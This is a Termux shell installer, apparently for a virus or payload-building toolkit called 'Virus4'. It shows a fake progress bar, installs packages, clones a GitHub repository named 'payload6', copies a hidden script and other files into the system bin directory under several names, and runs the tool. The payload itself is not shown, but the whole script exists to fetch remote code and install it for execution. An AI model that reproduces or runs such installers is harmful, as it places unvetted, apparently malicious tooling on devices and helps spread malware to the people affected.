c='\033[1;36m'
g='\033[1;32m'
p='\033[1;35m'
cd
clear
rm -rf $HOME/Virus4.zip
rm -rf $HOME/Virus4
rm -rf $HOME/../usr/bin/Virus4.sh
rm -rf $HOME/../usr/bin/Virus
rm -rf $HOME/../usr/bin/Virus4
rm -rf $HOME/../usr/bin/Virus4
rm -rf $HOME/../usr/bin/lovemam.sh
clear
echo -e "$c Amerr = $g https://www.facebook.com/100019536310282  "
echo -e "$g"
read -p "               -------(entar)------"
clear
echo -e $g 'Please Wait ===+['$p'>              '$g']\'
sleep 0.4
clear
echo -e $g 'Please Wait ===+['$p'->             '$g']|'
sleep 0.4
clear
echo -e $g 'Please Wait ===+['$p'-->            '$g']/'
sleep 0.4
clear
echo -e $g 'Please Wait ===+['$p'--->           '$g']\'
sleep 0.4
clear
echo -e $g 'Please Wait ===+['$p'---->          '$g']|'
pkg install git -y > nn.txt
clear
echo -e $g 'Please Wait ===+['$p'----->         '$g']/'
pkg install figlet -y > nn.txt
pkg install php -y > nn.txt
clear
echo -e $g 'Please Wait ===+['$p'------>        '$g']|'
pkg install python -y > nn.txt
clear
echo -e $g 'Please Wait ===+['$p'------>        '$g']\'
pkg install python2 -y > nn.txt
clear
echo -e $g 'Please Wait ===+['$p'------>        '$g']/'
pkg install python3 -y > nn.txt
clear
echo -e $g 'Please Wait ===+['$p'------->       '$g']|'
pkg install nano -y > nn.txt
clear
echo -e $g 'Please Wait ===+['$p'-------->      '$g']/'
pkg install curl -y > nn.txt
rm nn.txt
clear

echo -e $g 'Please Wait ===+['$p'--------->     '$g']\'
sleep 0.6
clear
echo -e $g 'Please Wait ===+['$p'---------->    '$g']|'
sleep 0.5
clear
echo -e $g 'Please Wait ===+['$p'----------->   '$g']/'
sleep 0.4
clear
echo -e $g 'Please Wait ===+['$p'-------------> '$g']\'
sleep 0.4
clear
echo -e $g 'Please Wait ===+['$p'-------------->'$g']|'
sleep 0.4
clear




echo -e "$g+++++++++++++++>$p[Please Wait]$g<++++++++++++++"

mkdir /sdcard/Virus4
mkdir /sdcard/Virus4/Encrypt
clear
echo -e "$g+++++++++++++++>$p[Please Wait]$g<++++++++++++++"
git clone https://github.com/Amerlaceset/payload6

cd 

cd Virus4

mv -v Virus4.zip $HOME

cd

cp Virus4/Virus4.zip $HOME

rm -rf Virus4

unzip Virus4.zip

cd Virus4 && chmod +x *
cd
cp $HOME/Virus4/Virus4.sh $HOME/../usr/bin/Virus4.sh
cp $HOME/Virus4/Virus4.sh $HOME/../usr/bin/Virus
cp $HOME/Virus4/.lovemam.sh $HOME/../usr/bin/lovemam.sh
cp $HOME/Virus4/Virus4.sh $HOME/../usr/bin/Virus4.sh

cp $HOME/Virus4/Virus4.sh $HOME/../usr/bin/Virus

cp $HOME/Virus4/Virus4.sh $HOME/../usr/bin/Virus4

cp $HOME/Virus4/Virus4.sh $HOME/../usr/bin/Virus4

cp $HOME/Virus4/.lovemam.sh $HOME/../usr/bin/lovemam.sh

chmod +x $HOME/../usr/bin/lovemam.sh

cd $HOME/Virus4/.tools


chmod +x */*

clear

chmod +x $HOME/../usr/bin/lovemam.sh
cd
rm -rf setupp
cd
rm -rf $HOME/Virus4.zip
cd $HOME/Virus4/.tools
chmod +x */*
clear

echo -e "$g+++++++++++>[$pWelcome to the new update$p$g]<+++++++++++++"
echo -e "     Hello      "
echo -e "     $p     new "
echo -e "     $g         Update "
sleep 2
Virus4